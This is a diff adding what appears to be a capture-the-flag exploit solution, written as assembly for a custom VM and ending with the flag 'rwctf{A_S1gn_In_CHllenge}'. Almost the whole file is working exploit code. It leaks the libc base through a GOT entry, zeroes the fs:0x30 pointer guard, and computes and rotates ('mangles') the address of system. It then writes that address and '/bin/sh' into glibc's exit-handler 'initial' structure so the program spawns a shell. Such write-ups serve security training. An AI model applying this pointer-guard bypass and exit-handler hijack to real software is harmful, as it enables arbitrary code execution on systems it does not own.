@@ -1,0 +1,88 @@
+# move sp to start of libc
+add esp, 0x3e03ff0
+mov ebp, esp
+
+add esp, 0x219050 # GOT calloc leak
+pop r08
+sub r08, 0x28080
+pop r09
+# libc base in r9 << 32 | r8
+
+
+# clear fs:0x30
+mov esp, ebp
+sub esp, 0x2888
+push 0
+push 0
+
+
+# craft system addr
+mov eax, r09
+mov ebx, r08
+add ebx, 0x50d60 
+
+# rol system addr by 0x11 (make vm stack writable)
+sub esp, 0x1000
+mov esi, 0x11
+call rol
+add esp, 0x1000
+prn ebx
+prn eax
+jmp write_payload
+
+setbit1:
+	cmp ecx, 0
+	je set0_1
+	mov ecx, 1
+set0_1:
+	ret
+
+setbit2:
+	cmp edx, 0
+	je set0_2
+	mov edx, 1
+set0_2:
+	ret
+
+rol: 
+	mov edi, 0
+
+	rol_loop:
+		mov ecx, eax
+		and ecx, 0x80000000
+		call setbit1
+		shl eax, 1
+
+		mov edx, ebx
+		and edx, 0x80000000
+		call setbit2
+		shl ebx, 1
+
+		or eax, edx
+		or ebx, ecx
+
+		inc edi
+		cmp edi, esi
+		jl rol_loop
+	ret
+
+
+write_payload:
+
+# move esp to `initial`
+mov esp, ebp
+add esp, 0x21af20
+add esp, 8
+
+# save /bin/sh to `arg` field
+mov edx, r08
+add edx, 0x1d8698
+push r09
+push edx
+
+# save mangled system addr to `at` field
+push eax
+push ebx
+
+
+# rwctf{A_S1gn_In_CHllenge}
